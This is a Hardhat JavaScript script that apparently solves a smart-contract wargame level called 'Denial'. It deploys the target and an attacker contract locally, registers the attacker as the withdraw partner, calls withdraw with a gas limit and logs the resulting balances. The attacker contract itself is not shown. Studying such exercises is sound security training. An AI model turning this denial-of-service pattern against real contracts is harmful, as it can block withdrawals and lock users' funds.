// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { expect } = require("chai");


async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');

    // We get the contract to deploy

    Denial = await hre.ethers.getContractFactory("Denial");
    target = await Denial.deploy();
    await target.deployed();

    const owner = await target.owner();

    const signers = await hre.ethers.getSigners();
    targetBalance1 = await hre.ethers.provider.getBalance(target.address);
    const amount = 100000;
    await signers[0].sendTransaction({ to: target.address, value: amount });
    targetBalance2 = await hre.ethers.provider.getBalance(target.address);
    expect(targetBalance2.sub(targetBalance1).toNumber()).to.equal(amount);

    DenialAtt = await hre.ethers.getContractFactory("DenialAtt");
    att = await DenialAtt.deploy(target.address);
    await att.deployed();

    tx = await target.setWithdrawPartner(att.address);
    await tx.wait();

    targetBalance1 = await hre.ethers.provider.getBalance(target.address);
    attBalance1 = await hre.ethers.provider.getBalance(att.address);
    owner1 = await hre.ethers.provider.getBalance(owner);
    target = target.connect(signers[1]);
    sign1Balance1 = await hre.ethers.provider.getBalance(signers[1].address);
    try {
        tx = await target.withdraw({ gasLimit: 1000000 });
        await tx.wait();
    } catch (err) {
        console.log(err);
    }

    sign1Balance2 = await hre.ethers.provider.getBalance(signers[1].address);
    console.log("signer1 from", sign1Balance1, "to", sign1Balance2, "diff", sign1Balance2.sub(sign1Balance1).toNumber());


    targetBalance2 = await hre.ethers.provider.getBalance(target.address);
    attBalance2 = await hre.ethers.provider.getBalance(att.address);
    owner2 = await hre.ethers.provider.getBalance(owner);
    console.log("att diff", attBalance2.sub(attBalance1).toNumber());
    console.log("owner diff", owner2.sub(owner1).toNumber());
    // expect(owner1.sub(owner2).toNumber()).to.equal(0);
}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
